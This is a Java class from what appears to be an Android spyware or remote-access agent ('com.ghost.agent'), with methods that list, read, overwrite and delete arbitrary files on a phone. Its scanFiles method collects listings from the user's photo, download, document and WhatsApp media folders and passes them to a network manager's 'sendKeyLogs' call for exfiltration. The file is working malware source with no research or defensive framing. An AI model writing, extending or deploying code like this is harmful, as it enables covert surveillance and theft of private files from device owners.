package com.ghost.agent.core;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class FileManager {
    
    private Context context;
    private NetworkManager networkManager;
    
    public FileManager(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
    }
    
    public JSONArray listFiles(String path) {
        JSONArray files = new JSONArray();
        
        try {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                File[] list = dir.listFiles();
                if (list != null) {
                    for (File f : list) {
                        JSONObject info = new JSONObject();
                        info.put("name", f.getName());
                        info.put("path", f.getAbsolutePath());
                        info.put("size", f.length());
                        info.put("isDir", f.isDirectory());
                        info.put("modified", 
                            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                                .format(new Date(f.lastModified())));
                        
                        if (f.isDirectory()) {
                            File[] children = f.listFiles();
                            info.put("children", children != null ? children.length : 0);
                        }
                        
                        files.put(info);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return files;
    }
    
    public String readFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists() || !f.isFile()) return null;
            
            FileInputStream fis = new FileInputStream(f);
            byte[] data = new byte[(int) f.length()];
            fis.read(data);
            fis.close();
            
            return Base64.encodeToString(data, Base64.NO_WRAP);
            
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    
    public boolean writeFile(String path, String base64) {
        try {
            byte[] data = Base64.decode(base64, Base64.DEFAULT);
            
            File f = new File(path);
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(data);
            fos.close();
            
            return true;
            
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
    
    public boolean deleteFile(String path) {
        return new File(path).delete();
    }
    
    public void scanFiles() {
        String[] dirs = {
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/Documents",
            "/storage/emulated/0/WhatsApp/Media"
        };
        
        JSONArray files = new JSONArray();
        
        for (String dir : dirs) {
            JSONArray list = listFiles(dir);
            for (int i = 0; i < list.length(); i++) {
                files.put(list.optJSONObject(i));
            }
        }
        
        if (files.length() > 0) {
            networkManager.sendKeyLogs(files.toString());
        }
    }
}
